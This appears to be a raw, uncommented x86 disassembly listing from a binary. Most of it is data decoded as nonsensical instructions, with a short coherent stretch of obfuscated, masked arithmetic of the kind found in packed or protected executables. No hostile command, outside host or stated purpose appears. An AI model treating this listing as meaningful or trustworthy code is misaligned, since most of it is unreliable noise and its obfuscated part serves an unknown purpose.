  40fe86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe87:	fild   DWORD PTR [ebp-0x5d13f71c]
  40fe8d:	push   0x76
  40fe8f:	inc    edi
  40fe90:	lock mov edi,0x599ab355
  40fe96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe97:	mov    al,0x8f
  40fe99:	jmp    0x40fed6
  40fe9b:	push   esp
  40fe9c:	test   eax,0x8c45858
  40fea1:	test   DWORD PTR [ebp-0x50958552],esp
  40fea7:	imul   ecx,DWORD PTR [ecx+0xe3c7258],0x561d0e93
  40feb1:	jge    0x40fed5
  40feb3:	mov    edi,0xe11ceec4
  40feb8:	outs   dx,BYTE PTR ds:[esi]
  40feb9:	out    dx,eax
  40feba:	imul   esp,DWORD PTR [esp+edx*1-0x48],0xffffff8f
  40febf:	(bad)  
  40fec1:	jl     0x40fe61
  40fec3:	loop   0x40ff25
  40fec5:	sub    eax,0x7de5b695
  40feca:	mov    bl,0x2d
  40fecc:	call   0x6da6e4e0
  40fed1:	in     al,dx
  40fed2:	sub    eax,0x1ad7c13e
  40fed7:	das    
  40fed8:	lods   al,BYTE PTR ds:[esi]
  40fed9:	inc    eax
  40feda:	pop    ebp
  40fedb:	pop    es
  40fedc:	mov    esi,DWORD PTR [ecx+0x1c]
  40fedf:	aam    0xc2
  40fee1:	lock jmp FWORD PTR ds:0x9b670348
  40fee8:	mov    dh,0x8d
  40feea:	mov    edx,0x755c680b
  40feef:	dec    edx
  40fef0:	js     0x40fe95
  40fef2:	bound  esp,QWORD PTR [ebp-0x73f7f263]
  40fef8:	push   ebx
  40fef9:	fsubr  st,st(6)
  40fefb:	or     eax,0x5c57c33d
  40ff00:	xchg   ecx,eax
  40ff01:	ss (bad) 
  40ff03:	mov    ch,0xc6
  40ff05:	int    0xc5
  40ff07:	pop    edx
  40ff08:	mov    ds:0x793c6706,eax
  40ff0d:	sbb    DWORD PTR [edx],edi
  40ff0f:	aaa    
  40ff10:	dec    esp
  40ff11:	aad    0x4e
  40ff13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff14:	xor    edi,esp
  40ff16:	ja     0x40ff3a
  40ff18:	(bad)  
  40ff19:	(bad)  
  40ff1a:	xor    eax,0xb9ef8205
  40ff1f:	std    
  40ff20:	lea    edi,[ebx]
  40ff22:	jecxz  0x40ff17
  40ff24:	or     al,0xf2
  40ff26:	scas   eax,DWORD PTR es:[edi]
  40ff27:	push   0x545f3b3f
  40ff2c:	dec    ebx
  40ff2d:	add    al,0x80
  40ff2f:	cmc    
  40ff30:	jp     0x40ffad
  40ff32:	xchg   ebx,eax
  40ff33:	pop    ss
  40ff34:	ret    0xcf4f
  40ff37:	jp     0x40ff6d
  40ff39:	pop    ebx
  40ff3a:	imul   esi,DWORD PTR [ebx],0x2293635
  40ff40:	call   0x55af129a
  40ff45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff46:	daa    
  40ff47:	(bad)  
  40ff48:	sub    al,0xaa
  40ff4a:	scas   eax,DWORD PTR es:[edi]
  40ff4b:	pusha  
  40ff4c:	jns    0x40fef8
  40ff4e:	adc    DWORD PTR [esi],ebx
  40ff50:	fcomp  st(3)
  40ff52:	test   eax,0xb5fff39b
  40ff57:	and    ah,al
  40ff59:	push   cs
  40ff5a:	or     eax,0x8116dcdc
  40ff5f:	xchg   esp,eax
  40ff60:	call   0x784ce061
  40ff65:	push   ebx
  40ff66:	sbb    BYTE PTR [eax+esi*1+0x43],0x3
  40ff6b:	popa   
  40ff6c:	sub    ebx,eax
  40ff6e:	dec    ebp
  40ff6f:	pop    ebp
  40ff70:	mov    esp,0xf8f0221e
  40ff75:	sbb    al,bh
  40ff77:	push   esp
  40ff78:	and    al,0xb1
  40ff7a:	ficomp DWORD PTR [ecx]
  40ff7c:	icebp  
  40ff7d:	repnz and eax,0x8f594992
  40ff83:	loop   0x40ffdf
  40ff85:	jns    0x40fff0
  40ff87:	imul   DWORD PTR [eax-0x56]
  40ff8a:	shl    dl,cl
  40ff8c:	loopne 0x40ff75
  40ff8e:	dec    edx
  40ff8f:	adc    eax,0xe398c8a2
  40ff94:	jecxz  0x40ff56
  40ff96:	ret    0x221
  40ff99:	or     dl,BYTE PTR [eax-0x35]
  40ff9c:	xchg   esp,eax
  40ff9d:	jb     0x40ffe6
  40ff9f:	adc    eax,0xfa61c6d2
  40ffa4:	or     dl,dh
  40ffa6:	out    0xc1,al
  40ffa8:	mov    ds:0x8bc10284,eax
  40ffad:	lds    edx,FWORD PTR [ecx+0x43]
  40ffb0:	ins    BYTE PTR es:[edi],dx
  40ffb1:	lods   eax,DWORD PTR ds:[esi]
  40ffb2:	xchg   edx,eax
  40ffb3:	int    0x34
  40ffb5:	and    ecx,DWORD PTR [eax]
  40ffb7:	push   edx
  40ffb8:	lods   al,BYTE PTR ds:[esi]
  40ffb9:	ja     0x410027
  40ffbb:	and    ch,BYTE PTR [ecx]
  40ffbd:	sbb    eax,0x5906afd8
  40ffc2:	sbb    DWORD PTR [edx+ecx*1],edx
  40ffc5:	dec    eax
  40ffc6:	pop    esp
  40ffc7:	sub    ebp,DWORD PTR [ecx]
  40ffc9:	je     0x40ffd7
  40ffcb:	jno    0x410022
  40ffcd:	leave  
  40ffce:	in     al,dx
  40ffcf:	enter  0xca60,0xf4
  40ffd3:	mov    dh,0x17
  40ffd5:	inc    ecx
  40ffd6:	adc    BYTE PTR [eax+0x5],0x31
  40ffda:	jns    0x40ffda
  40ffdc:	imul   edx,DWORD PTR [edi-0x26],0xffffffe8
  40ffe0:	add    ecx,esi
  40ffe2:	fcomp  st(3)
  40ffe4:	loop   0x40ffab
  40ffe6:	repnz mov esp,0xfa29ac55
  40ffec:	push   ds
  40ffed:	retf   
  40ffee:	(bad)  
  40fff1:	mov    esi,0x92d8dc2
  40fff6:	dec    ebx
  40fff7:	or     BYTE PTR [ecx+edi*4+0x18ff15d1],cl
  40fffe:	(bad)  
  410000:	sub    eax,0xa42ba9b1
  410005:	popf   
  410006:	cmp    esi,eax
  410008:	jmp    DWORD PTR [edi]
  41000a:	cmp    ecx,ecx
  41000c:	dec    ecx
  41000d:	sub    DWORD PTR ds:0x8a232f4e,esi
  410013:	mov    al,0x97
  410015:	ins    BYTE PTR es:[edi],dx
  410016:	rol    BYTE PTR [esi],0xe0
  410019:	add    bh,BYTE PTR [edx-0x5]
  41001c:	int3   
  41001d:	dec    ecx
  41001e:	stos   BYTE PTR es:[edi],al
  41001f:	mov    ecx,0x3d56789a
  410024:	fsub   QWORD PTR [edx]
  410026:	push   ss
  410027:	sbb    al,0x59
  410029:	shr    BYTE PTR [edi-0x53f03fb4],cl
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	je     0x41009d
  410032:	push   ss
  410033:	or     BYTE PTR [ecx],cl
  410035:	pop    ebx
  410036:	fisub  WORD PTR [edx+0x4f]
  410039:	cdq    
  41003a:	add    BYTE PTR [ebp-0x28f50c09],0xe8
  410041:	popa   
  410042:	hlt    
  410043:	stos   DWORD PTR es:[edi],eax
  410044:	enter  0x48dc,0xaf
  410048:	or     DWORD PTR [ebp-0x22],0x94bc0463
  41004f:	repz jnp 0x40ffff
  410052:	cmp    al,0x83
  410054:	adc    al,0xca
  410056:	xchg   ebx,eax
  410057:	mov    WORD PTR [eax-0x5a19c918],ds
  41005d:	sbb    al,0x74
  41005f:	or     eax,0xed5b0b2c
  410064:	push   ebx
  410065:	ret    0xda21
  410068:	les    eax,FWORD PTR [edi]
  41006a:	mov    DWORD PTR [ecx-0x56],edx
  41006d:	xchg   DWORD PTR [edx],ebx
  41006f:	add    al,0xcf
  410071:	ds cmc 
  410073:	ret    0x2299
  410076:	test   ebp,ebx
  410078:	cwde   
  410079:	stc    
  41007a:	push   eax
  41007b:	loope  0x41006d
  41007d:	fs push es
  41007f:	pushf  
  410080:	mov    ebp,0x1aec4931
  410085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410086:	pop    eax
  410087:	repnz push edi
  410089:	add    BYTE PTR [ebx],al
  41008b:	mov    BYTE PTR [ebp+0x6a54e3d7],dl
  410091:	pop    esi
  410092:	retf   
  410093:	fwait
  410094:	das    
  410095:	sahf   
  410096:	fdiv   DWORD PTR [edi+eax*4]
  410099:	hlt    
  41009a:	add    DWORD PTR ds:0xb78af8d7,ebp
  4100a0:	push   edx
  4100a1:	lahf   
  4100a2:	mov    ecx,0x1f709aa1
  4100a7:	push   esi
  4100a8:	outs   dx,DWORD PTR ds:[esi]
  4100a9:	adc    al,0x0
  4100ab:	mov    al,0x83
  4100ad:	push   ds
  4100ae:	aad    0x5a
  4100b0:	push   ss
  4100b1:	sbb    BYTE PTR [edx+esi*4+0x74],ah
  4100b5:	sahf   
  4100b6:	mov    ds,esp
  4100b8:	adc    bl,BYTE PTR [ebx]
  4100ba:	enter  0x1761,0x20
  4100be:	loopne 0x4100b7
  4100c0:	xchg   DWORD PTR [ecx],ebp
  4100c2:	dec    ebx
  4100c3:	jl     0x410129
  4100c5:	sub    DWORD PTR [ecx+0x17e3d564],edi
  4100cb:	inc    edi
  4100cc:	std    
  4100cd:	xchg   ecx,eax
  4100ce:	sbb    BYTE PTR [edi-0x178b860a],bl
  4100d4:	test   al,0x9c
  4100d6:	jge    0x410088
  4100d8:	fisttp WORD PTR [esi-0x4da831d]
  4100de:	mov    edx,0xe60ee233
  4100e3:	push   eax
  4100e4:	mov    DWORD PTR [ecx+eiz*1-0x241627e],esp
  4100eb:	or     al,0xb4
  4100ed:	test   eax,0x44cf9eb2
  4100f2:	xor    al,0xcd
  4100f4:	sub    dl,dl
  4100f6:	and    BYTE PTR [ebx],ah
  4100f8:	xor    al,0xf4
  4100fa:	mov    cl,0xb3
  4100fc:	test   DWORD PTR [ebx+ebx*1],eax
  4100ff:	inc    esp
  410100:	not    cl
  410102:	icebp  
  410103:	or     al,0xdb
  410105:	je     0x41008c
  410107:	push   cs
  410108:	sti    
  410109:	jl     0x4100ef
  41010b:	pop    esp
  41010c:	cmovo  ebx,esi
  41010f:	int    0x78
  410111:	clc    
  410112:	ins    BYTE PTR es:[edi],dx
  410113:	fcmovnbe st,st(0)
  410115:	dec    esi
  410116:	push   ss
  410117:	xlat   BYTE PTR ds:[ebx]
  410118:	mov    esi,cs
  41011a:	mov    cl,0x94
  41011c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41011d:	xor    BYTE PTR [esi+0x20],ch
  410120:	arpl   WORD PTR [ebx],cx
  410122:	add    al,0xb3
  410124:	mov    ebx,0xbf75c08
  410129:	bound  edx,QWORD PTR [esi]
  41012b:	les    esp,FWORD PTR fs:[edx-0x257e1b38]
  410132:	popa   
  410133:	(bad)  
  410134:	mov    dl,BYTE PTR [ecx+0x65]
  410137:	leave  
  410138:	jp     0x41017f
  41013a:	(bad)
  41013e:	daa    
  41013f:	call   0x2d54:0xfd6b9085
  410146:	push   ss
  410147:	add    al,0x27
  41014a:	sti    
  41014b:	pusha  
  41014c:	ja     0x410196
  41014e:	je     0x4101af
  410150:	mov    edi,0x1f2f2a32
  410155:	(bad)  [edi]
  410157:	or     esp,DWORD PTR ds:0x24115a4d
  41015d:	jg     0x410126
  41015f:	lds    esp,FWORD PTR [edi+0x64]
  410162:	inc    ecx
  410163:	add    WORD PTR [ecx+eiz*4],si
  410167:	ss pusha 
  410169:	mov    al,ds:0x8397567c
  41016e:	jmp    0x4101c3
  410170:	sub    BYTE PTR [eax],0x60
  410173:	mov    bh,BYTE PTR [edi]
  410175:	push   cs
  410176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410177:	jl     0x41014b
  410179:	stos   DWORD PTR es:[edi],eax
  41017a:	or     al,BYTE PTR [ecx-0x18faf751]
  410180:	fucom  st(5)
  410182:	in     eax,0x49
  410184:	mov    al,0x4
  410186:	int3   
  410187:	jne    0x4101da
  410189:	out    dx,eax
  41018a:	pusha  
  41018b:	aad    0x32
  41018d:	jl     0x410151
  41018f:	or     ecx,esp
  410191:	setbe  BYTE PTR [edi]
  410194:	cmp    eax,DWORD PTR [esi-0x4ad04190]
  41019a:	pop    ss
  41019b:	ja     0x4101f0
  41019d:	mov    ds:0xa65d93ff,eax
  4101a2:	popf   
  4101a3:	push   es
  4101a4:	popa   
  4101a5:	sub    eax,0x1f6474e
  4101aa:	sbb    edx,DWORD PTR [esi+0x46]
  4101ad:	cmp    eax,0x27216468
  4101b2:	pop    ebp
  4101b3:	ss push ecx
  4101b5:	mov    esi,0xa772fe9b
  4101ba:	in     al,0xc3
  4101bc:	fistp  QWORD PTR [ebx-0x37]
  4101bf:	cmp    ebx,edi
  4101c1:	sbb    dh,0x13
  4101c4:	push   ecx
  4101c5:	or     BYTE PTR [ebx+0x73ba3c65],dh
  4101cb:	inc    ebp
  4101cc:	daa    
  4101cd:	dec    esi
  4101ce:	jmp    0x41016e
  4101d0:	sbb    ch,0xe4
  4101d3:	ja     0x410192
  4101d5:	popa   
  4101d6:	xor    eax,0xa94af6df
  4101db:	out    0x18,eax
  4101dd:	test   al,0xbf
  4101df:	sbb    eax,0x74a96220
  4101e4:	or     eax,0x9b815d5a
  4101e9:	jle    0x4101d6
  4101eb:	pop    ecx
  4101ec:	jne    0x4101b7
  4101ee:	sahf   
  4101ef:	mov    eax,cs
  4101f1:	out    dx,eax
  4101f2:	fbld   TBYTE PTR [ecx+0x3df047b9]
  4101f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101f9:	fnstenv ss:[edi]
  4101fc:	xchg   BYTE PTR [esi],ch
  4101fe:	inc    ebp
  4101ff:	out    0x8c,al
  410201:	mov    al,ds:0xe23b1998
  410206:	jnp    0x41020b
  410208:	jb     0x4101e8
  41020a:	and    esi,0xbf4520a2
  410210:	inc    esp
  410211:	push   ecx
  410212:	adc    al,0xbc
  410214:	fwait
  410215:	dec    edi
  410216:	sub    BYTE PTR [esi+0x38fd5c2e],dh
  41021c:	icebp  
  41021d:	jns    0x410255
  41021f:	dec    ebx
  410220:	daa    
  410221:	dec    eax
  410222:	gs call 0x124adc83
  410228:	bt     DWORD PTR [edi],eax
  41022b:	or     esp,DWORD PTR [ebp-0x6b4136e8]
  410231:	dec    ecx
  410232:	pop    esp
  410233:	and    eax,0xe3973dd2
  410238:	xchg   ebx,eax
  410239:	hlt    
  41023a:	or     al,0x1e
  41023c:	add    eax,edi
  41023e:	imul   eax,ebx
  410241:	cmp    eax,edx
  410243:	ja     0x4191d2
  410249:	mov    edx,DWORD PTR [ebp-0x10]
  41024c:	mov    eax,DWORD PTR [ebp-0x14]
  41024f:	mov    ebx,DWORD PTR [ebp-0x28]
  410252:	sub    eax,edx
  410254:	xor    ebx,esi
  410256:	xor    edx,edx
  410258:	add    ebx,edi
  41025a:	div    ebx
  41025c:	mov    DWORD PTR [ebp-0x8],eax
  41025f:	mov    eax,DWORD PTR [ebp-0x2c]
  410262:	mov    edx,DWORD PTR [ebp-0x8]
  410265:	xor    eax,esi
  410267:	add    eax,edi
  410269:	cmp    edx,eax
  41026b:	jbe    0x41027b
  410271:	mov    eax,DWORD PTR [ebp-0x2c]
  410274:	xor    eax,esi
  410276:	add    eax,edi
  410278:	mov    DWORD PTR [ebp-0x8],eax
  41027b:	mov    eax,DWORD PTR [ebp-0x28]
  41027e:	mov    edx,DWORD PTR [ebp-0x8]
  410281:	xor    eax,esi
  410283:	add    eax,edi
  410285:	imul   eax,edx
  410288:	mov    DWORD PTR [ebp-0x8],eax
  41028b:	mov    eax,DWORD PTR [ebp-0x3c]
  41028e:	mov    edx,DWORD PTR [ebp-0x8]
  410291:	xor    eax,esi
  410293:	add    eax,edi
  410295:	cmp    edx,eax
  410297:	je     0x4191bb
  41029d:	mov    eax,DWORD PTR [ebp-0x8]
  4102a0:	mov    DWORD PTR [ebp-0x20],eax
  4102a3:	mov    eax,DWORD PTR [ebp-0x10]
  4102a6:	add    eax,DWORD PTR [ebp-0x40]
  4102a9:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  4102b0:	mov    DWORD PTR [ebp-0x8],eax
  4102b3:	mov    eax,0xf89c85b5
  4102b8:	mov    DWORD PTR [ebp-0x1c],eax
  4102bb:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  4102c2:	mov    DWORD PTR [ebp-0x30],eax
  4102c5:	mov    eax,DWORD PTR [ebp-0x24]
  4102c8:	xor    eax,esi
  4102ca:	add    eax,edi
  4102cc:	jmp    0x416dfa
  4102d1:	mov    DWORD PTR [ebp-0x48],0xf89c85be
  4102d8:	mov    DWORD PTR [ebp-0x4c],0xf89c85a1
  4102df:	mov    eax,DWORD PTR [ebp-0x30]
  4102e2:	mov    edx,DWORD PTR [ebp-0xc]
  4102e5:	xor    eax,esi
  4102e7:	add    eax,edi
  4102e9:	imul   eax,edx
  4102ec:	mov    edx,DWORD PTR [ebp-0x1c]
  4102ef:	xor    edx,esi
  4102f1:	add    eax,edx
  4102f3:	mov    edx,DWORD PTR [ebp-0x8]
  4102f6:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  4102fd:	mov    BYTE PTR [ebp-0x1],al
  410300:	mov    eax,DWORD PTR [ebp-0x1c]
  410303:	mov    edx,DWORD PTR [ebp-0x1c]
  410306:	xor    eax,esi
  410308:	xor    edx,esi
  41030a:	lea    ebx,[eax+edx*1+0x64e5b6]
  410311:	mov    eax,DWORD PTR [ebp-0xc]
  410314:	xor    edx,edx
  410316:	div    ebx
  410318:	mov    eax,DWORD PTR [ebp-0x1c]
  41031b:	xor    eax,esi
  41031d:	add    eax,edi
  41031f:	cmp    edx,eax
  410321:	mov    eax,DWORD PTR [ebp-0x30]
  410324:	mov    edx,DWORD PTR [ebp-0xc]
  410327:	jmp    0x41269c
  41032c:	lods   al,BYTE PTR ds:[esi]
  41032d:	jbe    0x410322
  41032f:	loop   0x4102d4
  410331:	jmp    DWORD PTR [ebx-0x2d50dedc]
  410337:	into   
  410338:	shl    DWORD PTR [eax-0x714034b0],cl
  41033e:	bound  esp,QWORD PTR [edx+0xa]
  410341:	pop    edi
  410342:	bound  esp,QWORD PTR [edx-0x66]
  410345:	cmp    esp,DWORD PTR [ebx]
  410347:	push   0xffffffd3
  410349:	and    DWORD PTR [esp+edi*1+0x31],ebx
  41034d:	es test eax,0xfd56c991
  410353:	pop    edx
  410354:	popf   
  410355:	div    DWORD PTR [edi-0xf6fc6c]
  41035b:	nop
  41035c:	cmp    eax,0x652a8e8
  410361:	ja     0x41037a
  410363:	sbb    al,0x2
  410365:	mov    dh,0xb1
  410367:	xor    eax,0x6281bb93
  41036c:	jb     0x4103d6
  41036e:	gs xchg ebp,edx
  410371:	sbb    DWORD PTR [ebx+0x1f],eax
  410374:	scas   al,BYTE PTR es:[edi]
  410375:	sub    eax,0x362be46d
  41037a:	or     DWORD PTR [esi],eax
  41037c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41037d:	adc    ah,BYTE PTR [edx+0x37]
  410380:	mov    bh,0x9c
  410382:	sbb    dh,BYTE PTR [ebx+0x73]
  410385:	stos   BYTE PTR es:[edi],al
  410386:	clc    
  410387:	mov    ecx,DWORD PTR [esi+ebp*8]
  41038a:	xchg   DWORD PTR [ecx+ebp*8-0x53],esi
  41038e:	rcr    DWORD PTR [edx],0xa0
  410391:	xchg   BYTE PTR [edx+0x7acc5812],bl
  410397:	jnp    0x41035f
  410399:	or     ebp,esp
  41039b:	ror    DWORD PTR [ebx-0x12514e8],1
  4103a1:	(bad)  [ecx+0x38]
  4103a4:	pop    ds
  4103a5:	inc    edi
  4103a6:	fwait
  4103a7:	push   ecx
  4103a8:	pop    es
  4103a9:	(bad)  
  4103aa:	sub    eax,0xf82f3275
  4103af:	loopne 0x41037b
  4103b1:	data16 mov dh,0xcf
  4103b4:	jnp    0x410351
  4103b6:	sub    eax,0xbbc56900
  4103bb:	ss add eax,0xb49a91ed
  4103c1:	or     esp,0xa2f4c9a4
  4103c7:	jp     0x410404
  4103c9:	in     eax,0x89
  4103cb:	test   DWORD PTR [ecx-0x13e2bf80],ebp
  4103d1:	sbb    esp,ebx
  4103d3:	cmp    ebp,edi
  4103d5:	xor    eax,0xc2968107
  4103da:	shl    cl,cl
  4103dc:	push   ss
  4103dd:	xchg   esi,eax
  4103de:	mov    DWORD PTR [esi-0x1e],esp
  4103e1:	push   edx
  4103e2:	pop    esi
  4103e3:	xor    al,0x67
  4103e5:	sub    al,0x50
  4103e7:	call   0x92333eaf
  4103ec:	loope  0x410416
  4103ee:	aas    
  4103ef:	cmp    eax,0xc07c15c0
  4103f4:	cli    
  4103f5:	(bad)  [esi+0x8]
  4103f8:	inc    ecx
  4103f9:	mov    ebp,0xeb6ed745
  4103fe:	gs inc eax
  410400:	cmc    
  410401:	dec    edx
  410402:	shr    BYTE PTR [edx-0xf],1
  410405:	js     0x41047b
  410407:	inc    ebp
  410408:	clc    
  410409:	lea    esi,[ebx+0xdc17406]
  41040f:	cmp    eax,0xb7b3addc
  410414:	inc    eax
  410415:	fnsave [ebx]
  410417:	xchg   edi,eax
  410418:	addr16 aam 0xee
  41041b:	stos   BYTE PTR es:[edi],al
  41041c:	xchg   edi,eax
  41041d:	lds    esp,FWORD PTR [ebp+0x21]
  410420:	das    
  410421:	ror    bl,cl
  410423:	mov    ds:0xb7495b9c,eax
  410428:	add    ebp,DWORD PTR [esp+ebx*8]
  41042b:	sub    DWORD PTR [ecx],ebx
  41042d:	xchg   edi,eax
  41042e:	sar    DWORD PTR [esi+edx*2+0x50],0x98
  410433:	sub    BYTE PTR [eax],0xef
  410436:	pop    ss
  410437:	enter  0x5062,0xb2
  41043b:	sahf   
  41043c:	add    eax,0x7b92af5a
  410441:	xor    edx,ebx
  410443:	cld    
  410444:	loopne 0x410449
  410446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410447:	retf   
  410448:	ss jnp 0x410441
  41044b:	retf   0x8cb8
  41044e:	dec    ebx
  41044f:	xchg   ecx,eax
  410450:	push   edx
  410451:	test   DWORD PTR [ebx],0x964f33dc
  410457:	mov    ebx,0x5230bcb9
  41045c:	and    eax,0xd628b260
  410461:	inc    edx
  410462:	pop    ebx
  410463:	inc    ebp
  410464:	mov    dl,0xea
  410466:	das    
  410467:	sbb    eax,ebx
  410469:	sub    eax,0x6fbbfa36
  41046e:	xchg   ebp,eax
  41046f:	mov    ebp,0x86448b8a
  410474:	jnp    0x4104ea
  410476:	cmc    
  410477:	rol    BYTE PTR [ebp-0x4732d753],0xe9
  41047e:	xor    eax,edx
  410480:	xchg   edi,eax
  410481:	jnp    0x41044e
  410483:	inc    edx
  410484:	and    cl,bh
  410486:	mov    cl,0x81
  410488:	scas   eax,DWORD PTR es:[edi]
  410489:	sbb    al,0xd9
  41048b:	or     BYTE PTR [eax],bl
  41048d:	xor    eax,0x4ad2cc01
  410492:	mov    edi,0x23e49d4f
  410497:	mov    ecx,0x602db689
  41049c:	cmc    
  41049d:	std    
  41049e:	mov    al,0xf9
  4104a0:	retf   0x1cd7
  4104a3:	xor    al,0x35
  4104a5:	imul   ebx,DWORD PTR [eax-0x2c],0xffffffd9
  4104a9:	push   ss
  4104aa:	(bad)
  4104ad:	cmp    eax,eax
  4104af:	je     0x41047f
  4104b1:	retf   0x2231
  4104b4:	or     eax,0x8c0e393e
  4104b9:	mov    BYTE PTR [esi],bl
  4104bb:	mov    ah,0xef
  4104bd:	fnstcw WORD PTR [si]
  4104c0:	pop    ecx
  4104c1:	push   ebp
  4104c2:	jne    0x4104e8
  4104c4:	push   edi
  4104c5:	test   al,0xa4
  4104c7:	popa   
  4104c8:	mov    al,0xb5
  4104ca:	repnz stc 
  4104cc:	mov    ecx,0x94acdfbc
  4104d1:	adc    edi,ebx
  4104d3:	(bad)  
  4104d4:	(bad)  
  4104d5:	xlat   BYTE PTR ds:[ebx]
  4104d6:	jge    0x4104ca
  4104d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104d9:	arpl   WORD PTR [edx-0x74f7f411],sp
  4104df:	in     al,0xb2
  4104e1:	xchg   edi,eax
  4104e2:	fist   WORD PTR [edi-0x10a2edec]
  4104e8:	ror    DWORD PTR [bp-0x5058],1
  4104ed:	sub    al,0x5
  4104ef:	xor    al,0x8d
  4104f1:	mov    BYTE PTR [edi-0x44c85837],0x45
  4104f8:	inc    edx
  4104f9:	sbb    DWORD PTR [esi+eax*8],ebp
  4104fc:	popf   
  4104fd:	pop    ecx
  4104fe:	dec    ecx
  4104ff:	fdivr  DWORD PTR [edx]
  410501:	or     ecx,ecx
  410503:	mov    al,ds:0x2a9bebfa
  410508:	pop    esi
  410509:	stos   BYTE PTR es:[edi],al
  41050a:	not    DWORD PTR [ecx+0x3e]
  41050d:	fisttp WORD PTR [ebp+0x5e]
  410510:	neg    ecx
  410512:	xor    DWORD PTR [eax-0x7b32a556],esi
  410518:	js     0x410528
  41051a:	inc    ebp
  41051b:	or     al,0x9d
  41051e:	das    
  41051f:	dec    edi
  410520:	mov    bh,0xb3
  410522:	sbb    DWORD PTR [edi-0x406a5a3c],ecx
  410528:	sti    
  410529:	retf   0x500
  41052c:	test   BYTE PTR ds:0xd36850e,0x9c
  410533:	pop    es
  410534:	pop    ss
  410535:	push   es
  410536:	loope  0x41054c
  410538:	inc    ebx
  410539:	pusha  
  41053a:	mov    ds:0x8ed4666f,eax
  41053f:	call   DWORD PTR [ecx-0x23d82539]
  410545:	pop    edi
  410546:	fld    QWORD PTR [edi-0x34196f68]
  41054c:	mov    esi,0xb89a2ac1
  410551:	retf   
  410552:	rcr    DWORD PTR [esi-0x28ed7d68],0x24
  410559:	les    ebx,FWORD PTR [edx-0x23]
  41055c:	jp     0x4105a2
  41055e:	cmp    al,0x4b
  410560:	and    al,0xd4
  410562:	ss call 0x1eb:0x9f121861
  41056a:	div    BYTE PTR [ecx+0x21f809b8]
  410570:	add    ebx,ecx
  410572:	addr16 inc edi
  410574:	cmc    
  410575:	out    0xdc,al
  410577:	stos   DWORD PTR es:[edi],eax
  410578:	mov    ah,0xc1
  41057a:	stos   DWORD PTR es:[edi],eax
  41057b:	add    eax,0x4fc690aa
  410580:	out    dx,al
  410581:	hlt    
  410582:	mov    ecx,0x34112f86
  410587:	loopne 0x4105b8
  410589:	lock xor BYTE PTR [ebx],bh
  41058c:	mov    eax,0xb23edb5d
  410591:	dec    esp
  410592:	dec    edi
  410593:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410594:	aaa    
  410595:	(bad)
  410598:	mov    al,0x51
  41059a:	aaa    
  41059b:	call   0xdd84:0xa24f2505
  4105a2:	rcl    BYTE PTR [ecx+0x50],0xe4
  4105a6:	mov    dh,0xc
  4105a8:	or     ch,BYTE PTR [ebp-0x44]
  4105ab:	xor    eax,0xf38f82af
  4105b0:	mov    ah,0xa8
  4105b2:	mov    ds:0x37da81f0,al
  4105b7:	mov    ds:0x4f238e1e,eax
  4105bc:	add    al,0x3a
  4105be:	neg    ecx
  4105c0:	xchg   ebx,eax
  4105c1:	jecxz  0x410640
  4105c3:	and    ah,BYTE PTR [edi]
  4105c5:	add    cl,BYTE PTR [ecx+0x73]
  4105c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105c9:	inc    edi
  4105ca:	loop   0x41064b
  4105cc:	xchg   ebx,eax
  4105cd:	aaa    
  4105ce:	xor    ebx,ebx
  4105d0:	pusha  
  4105d1:	(bad)  
  4105d2:	push   ds
  4105d3:	push   ss
  4105d4:	dec    ebp
  4105d5:	cmp    ch,BYTE PTR [esi]
  4105d7:	loope  0x41059d
  4105d9:	dec    edi
  4105da:	xchg   edx,eax
  4105db:	xor    BYTE PTR ds:0xcf8771c5,ch
  4105e1:	mov    bl,0xe7
  4105e3:	test   al,0x46
  4105e5:	fadd   DWORD PTR [edx+0x51c86b09]
  4105eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105ec:	in     eax,0x1e
  4105ee:	cmp    ebp,DWORD PTR [eax+ebp*4+0x35a6a388]
  4105f5:	jae    0x410620
  4105f7:	ds cs jbe 0x4105f1
  4105fb:	ins    DWORD PTR es:[edi],dx
  4105fc:	mov    ch,0xd
  4105fe:	xor    bh,BYTE PTR [esp+ebp*4]
  410601:	fs dec ebx
  410603:	and    al,0x8c
  410605:	push   edx
  410606:	pop    ss
  410607:	jecxz  0x41064f
  410609:	sbb    ebx,esi
  41060b:	jb     0x4105a2
  41060d:	cmp    DWORD PTR [edi-0x5aaff09f],esp
  410613:	int    0xcb
  410615:	scas   al,BYTE PTR es:[edi]
  410616:	dec    esp
  410617:	mov    ebp,0x75d20c2
  41061c:	retf   
  41061d:	(bad)  
  41061e:	bnd ret 0xb806
  410622:	nop
  410623:	mov    dh,0x14
  410625:	push   0xbd4df15f
  41062a:	pop    esp
  41062b:	dec    eax
  41062c:	aad    0x97
  41062e:	mov    dh,0xd3
  410630:	and    al,0xdc
  410632:	push   edx
  410633:	and    edi,DWORD PTR [ebx+0x76bce8b]
  410639:	jmp    0x410655
  41063b:	cmp    al,0x52
  41063d:	add    BYTE PTR fs:[eax+0x58],0x73
  410642:	stos   DWORD PTR es:[edi],eax
  410643:	jge    0x410650
  410645:	ffreep st(3)
  410647:	mov    ds:0x52ea0db9,eax
  41064c:	cld    
  41064d:	lods   eax,DWORD PTR ds:[esi]
  41064e:	xchg   ebx,eax
  41064f:	mov    ebp,0x12d13ace
  410654:	fwait
  410655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410656:	cdq    
  410657:	sub    eax,0xb143d5e4
  41065c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41065d:	cmp    DWORD PTR [eax],esp
